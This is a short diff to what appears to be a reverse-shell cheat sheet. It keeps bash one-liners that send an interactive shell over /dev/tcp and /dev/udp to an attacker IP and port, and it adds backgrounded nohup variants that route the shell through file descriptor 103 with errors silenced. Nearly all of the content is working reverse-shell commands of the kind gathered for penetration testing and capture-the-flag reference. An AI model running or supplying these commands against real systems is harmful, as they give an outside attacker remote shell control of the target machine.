@@ -4,7 +4,11 @@
 
 - Target
 
-`$ /bin/bash -i >& /dev/tcp/<IP>/<LPORT> 0>&1`
+```
+$ /bin/bash -i >& /dev/tcp/<IP>/<LPORT> 0>&1
+
+$ nohup 0<&103-;exec 103<>/dev/tcp/<IP>/<LPORT>; sh <&103 >&103 2>&103 &2>/dev/null; sleep 1; exit
+```
 
 - Attacker
 
@@ -14,7 +18,11 @@
 
 - Target
 
-`$ /bin/bash -i >& /dev/udp/<IP>/<LPORT> 0>&1`
+```
+$ /bin/bash -i >& /dev/udp/<IP>/<LPORT> 0>&1
+
+$ nohup 0<&103-;exec 103<>/dev/udp/<IP>/<LPORT>; sh <&103 >&103 2>&103 &2>/dev/null; sleep 1; exit
+```
 
 - Attacker
 
